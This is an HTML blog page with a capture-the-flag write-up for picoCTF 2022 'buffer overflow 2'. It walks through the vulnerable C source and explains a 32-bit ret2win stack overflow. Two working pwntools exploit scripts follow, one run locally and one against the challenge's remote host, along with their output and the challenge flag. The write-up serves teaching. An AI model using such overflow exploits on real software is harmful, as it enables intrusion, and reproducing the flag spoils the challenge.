@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <title>buffer overflow 2 | abund4nt</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1">
+    <meta name="description" content="picoCTF 2022 / Buffer Overflow 32 bits / ret2win">
+    <meta name="generator" content="Hugo 0.123.7">
+    
+    
+    
+    
+      <meta name="robots" content="noindex, nofollow">
+    
+    
+      <meta name="author" content = "abund4nt">
+    
+
+    
+
+    
+<link rel="stylesheet" href="/ananke/css/main.min.css" >
+
+
+
+    
+
+    
+      
+
+    
+
+    
+
+    
+      <link rel="canonical" href="https://abund4nt.github.io/pwn/buffer-overflow-2/">
+    
+
+    <meta property="og:title" content="buffer overflow 2" />
+<meta property="og:description" content="picoCTF 2022 / Buffer Overflow 32 bits / ret2win" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://abund4nt.github.io/pwn/buffer-overflow-2/" /><meta property="article:section" content="pwn" />
+<meta property="article:published_time" content="2024-07-15T22:29:17-04:00" />
+<meta property="article:modified_time" content="2024-07-15T22:29:17-04:00" />
+
+<meta itemprop="name" content="buffer overflow 2">
+<meta itemprop="description" content="picoCTF 2022 / Buffer Overflow 32 bits / ret2win"><meta itemprop="datePublished" content="2024-07-15T22:29:17-04:00" />
+<meta itemprop="dateModified" content="2024-07-15T22:29:17-04:00" />
+<meta itemprop="wordCount" content="535">
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/><meta name="twitter:title" content="buffer overflow 2"/>
+<meta name="twitter:description" content="picoCTF 2022 / Buffer Overflow 32 bits / ret2win"/>
+
+	
+  </head>
+
+  <body class="ma0 avenir bg-near-white">
+
+    
+   
+  
+
+  <header>
+    <div class="bg-black">
+      <nav class="pv3 ph3 ph4-ns" role="navigation">
+  <div class="flex-l justify-between items-center center">
+    <a href="/" class="f3 fw2 hover-white no-underline white-90 dib">
+      
+        abund4nt
+      
+    </a>
+    <div class="flex-l items-center">
+      
+
+      
+        <ul class="pl0 mr3">
+          
+          <li class="list f5 f4-ns fw4 dib pr3">
+            <a class="hover-white no-underline white-90" href="/crypto/" title="Crypto page">
+              Crypto
+            </a>
+          </li>
+          
+          <li class="list f5 f4-ns fw4 dib pr3">
+            <a class="hover-white no-underline white-90" href="/pwn/" title="Pwn page">
+              Pwn
+            </a>
+          </li>
+          
+        </ul>
+      
+      
+<div class="ananke-socials">
+  
+    
+    <a href="https://github.com/abund4nt" target="_blank" rel="noopener" class="github ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="GitHub link" aria-label="follow on GitHub——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 512 512;" version="1.1" viewBox="0 0 512 512"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+  <path d="M256,32C132.3,32,32,134.8,32,261.7c0,101.5,64.2,187.5,153.2,217.9c11.2,2.1,15.3-5,15.3-11.1   c0-5.5-0.2-19.9-0.3-39.1c-62.3,13.9-75.5-30.8-75.5-30.8c-10.2-26.5-24.9-33.6-24.9-33.6c-20.3-14.3,1.5-14,1.5-14   c22.5,1.6,34.3,23.7,34.3,23.7c20,35.1,52.4,25,65.2,19.1c2-14.8,7.8-25,14.2-30.7c-49.7-5.8-102-25.5-102-113.5   c0-25.1,8.7-45.6,23-61.6c-2.3-5.8-10-29.2,2.2-60.8c0,0,18.8-6.2,61.6,23.5c17.9-5.1,37-7.6,56.1-7.7c19,0.1,38.2,2.6,56.1,7.7   c42.8-29.7,61.5-23.5,61.5-23.5c12.2,31.6,4.5,55,2.2,60.8c14.3,16.1,23,36.6,23,61.6c0,88.2-52.4,107.6-102.3,113.3   c8,7.1,15.2,21.1,15.2,42.5c0,30.7-0.3,55.5-0.3,63c0,6.1,4,13.3,15.4,11C415.9,449.1,480,363.1,480,261.7   C480,134.8,379.7,32,256,32z"/>
+</svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+</div>
+
+    </div>
+  </div>
+</nav>
+
+    </div>
+  </header>
+
+
+
+    <main class="pb7" role="main">
+      
+  
+  <article class="flex-l flex-wrap justify-between mw8 center ph3">
+    <header class="mt4 w-100">
+      <aside class="instapaper_ignoref b helvetica tracked ttu">
+          
+        Binary Explotation
+      </aside>
+      
+
+
+
+
+
+
+
+
+
+
+  <div id="sharing" class="mt3 ananke-socials">
+    
+  </div>
+
+
+      <h1 class="f1 athelas mt3 mb1">buffer overflow 2</h1>
+      
+      <p class="tracked">
+        By <strong>abund4nt</strong>
+      </p>
+      
+      
+      
+      <time class="f6 mv4 dib tracked" datetime="2024-07-15T22:29:17-04:00">July 15, 2024</time>
+      
+
+      
+      
+    </header>
+    <div class="nested-copy-line-height lh-copy serif f4 nested-links black pr4-l w-two-thirds-l"><p>We are provided with a compiled binary <code>vuln</code>, the source code <code>vuln.c</code> and a remote instance to connect to.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BUFSIZE 100
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define FLAGSIZE 64
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> arg1, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> arg2) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[FLAGSIZE];
+</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (f <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s %s&#34;</span>, <span style="color:#e6db74">&#34;Please create &#39;flag.txt&#39; in this directory with your&#34;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;own debugging flag.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fgets</span>(buf,FLAGSIZE,f);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (arg1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xCAFEF00D</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (arg2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xF00DF00D</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(buf);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[BUFSIZE];
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>(buf);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(buf);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">gid_t</span> gid <span style="color:#f92672">=</span> <span style="color:#a6e22e">getegid</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setresgid</span>(gid, gid, gid);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Please enter your string: &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">vuln</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="source-code-analysis">Source code analysis</h2>
+<p>We can see that it defines a BUFSIZE of 100 bytes with a FLAGSIZE of 64 bytes, in this code we have two relevant functions <code>win()</code> and <code>vuln()</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[BUFSIZE];
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>(buf);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(buf);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>In the <code>vuln()</code> function it defines a buffer using the BUFSIZE constant with puts to take our input and process it with <code>gets()</code>, as we know <code>gets()</code> is an insecure function and reading its documentation we do not recommend its use.</p>
+<p><img src="https://i.imgur.com/tLtUOWt.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> arg1, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> arg2) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[FLAGSIZE];
+</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (f <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s %s&#34;</span>, <span style="color:#e6db74">&#34;Please create &#39;flag.txt&#39; in this directory with your&#34;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;own debugging flag.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fgets</span>(buf,FLAGSIZE,f);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (arg1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xCAFEF00D</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (arg2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xF00DF00D</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(buf);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Then we have a function <code>win()</code> which shows us the flag, the difficulty of this challenge is that we must do a ROP to be able to open the flag, since our first argument has to have the value of <code>0xCAFEF00D</code> and our second argument has to have a value of <code>0xF00DF00D</code>.</p>
+<h2 id="vulnerabilidad">Vulnerabilidad</h2>
+<p>We are facing a binary vulnerable to Buffer Overflow, we must overwrite the return address and then call the <code>win()</code> function and through ROP pass the memory addresses expected by the program.</p>
+<p>Investigating I found these notes which were of much help to solve the challenge.</p>
+<p><a href="https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions">https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions</a></p>
+<h2 id="flag">Flag</h2>
+<p>To solve the challenge locally create a file called <code>flag.txt</code> and with the following script I managed to get the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>from pwn import *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Open binary</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;./vuln&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Payload</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> b<span style="color:#e6db74">&#39;A&#39;</span> * <span style="color:#ae81ff">112</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32<span style="color:#f92672">(</span>0x08049296<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32<span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32<span style="color:#f92672">(</span>0xCAFEF00D<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32<span style="color:#f92672">(</span>0xF00DF00D<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log.info<span style="color:#f92672">(</span>p.clean<span style="color:#f92672">())</span>
+</span></span><span style="display:flex;"><span>p.sendline<span style="color:#f92672">(</span>payload<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>log.info<span style="color:#f92672">(</span>p.clean<span style="color:#f92672">())</span>
+</span></span></code></pre></div><p>When executing the exploit we obtain the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 solve_local.py
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./vuln&#39;</span>: pid <span style="color:#ae81ff">8479</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Please enter your string:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    picoCTF<span style="color:#f92672">{</span>f4k3_fl4g_f0r_t3st1ng<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Stopped process <span style="color:#e6db74">&#39;./vuln&#39;</span> <span style="color:#f92672">(</span>pid <span style="color:#ae81ff">8479</span>
+</span></span></code></pre></div><p>Now I modified some things in the script to get the flag on the remote instance.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_process</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;Usage: python3 solve.py &lt;ip:port&gt;&#39;</span>)
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    host, port <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> remote(host, int(port))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Remote instance</span>
+</span></span><span style="display:flex;"><span>    conn <span style="color:#f92672">=</span> get_process()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Payload</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">112</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x08049296</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x0</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xCAFEF00D</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xF00DF00D</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Please enter your string: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, payload)
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Flag</span>
+</span></span><span style="display:flex;"><span>    print(conn<span style="color:#f92672">.</span>recv())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>When executing the script we get the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 solve.py saturn.picoctf.net:61694
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to saturn.picoctf.net on port 61694: Done
+</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;picoCTF{argum3nt5_4_d4yZ_3c04eab0}&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed connection to saturn.picoctf.net port <span style="color:#ae81ff">61694</span>
+</span></span></code></pre></div><ul class="pa0">
+  
+</ul>
+<div class="mt6 instapaper_ignoref">
+      
+      
+      </div>
+    </div>
+
+    <aside class="w-30-l mt6-l">
+
+
+
+
+</aside>
+
+  </article>
+
+    </main>
+    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
+  <div class="flex justify-between">
+  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://abund4nt.github.io/" >
+    &copy;  abund4nt 2024 
+  </a>
+    <div>
+<div class="ananke-socials">
+  
+    
+    <a href="https://github.com/abund4nt" target="_blank" rel="noopener" class="github ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="GitHub link" aria-label="follow on GitHub——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 512 512;" version="1.1" viewBox="0 0 512 512"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+  <path d="M256,32C132.3,32,32,134.8,32,261.7c0,101.5,64.2,187.5,153.2,217.9c11.2,2.1,15.3-5,15.3-11.1   c0-5.5-0.2-19.9-0.3-39.1c-62.3,13.9-75.5-30.8-75.5-30.8c-10.2-26.5-24.9-33.6-24.9-33.6c-20.3-14.3,1.5-14,1.5-14   c22.5,1.6,34.3,23.7,34.3,23.7c20,35.1,52.4,25,65.2,19.1c2-14.8,7.8-25,14.2-30.7c-49.7-5.8-102-25.5-102-113.5   c0-25.1,8.7-45.6,23-61.6c-2.3-5.8-10-29.2,2.2-60.8c0,0,18.8-6.2,61.6,23.5c17.9-5.1,37-7.6,56.1-7.7c19,0.1,38.2,2.6,56.1,7.7   c42.8-29.7,61.5-23.5,61.5-23.5c12.2,31.6,4.5,55,2.2,60.8c14.3,16.1,23,36.6,23,61.6c0,88.2-52.4,107.6-102.3,113.3   c8,7.1,15.2,21.1,15.2,42.5c0,30.7-0.3,55.5-0.3,63c0,6.1,4,13.3,15.4,11C415.9,449.1,480,363.1,480,261.7   C480,134.8,379.7,32,256,32z"/>
+</svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+</div>
+</div>
+  </div>
+</footer>
+
+  </body>
+</html>
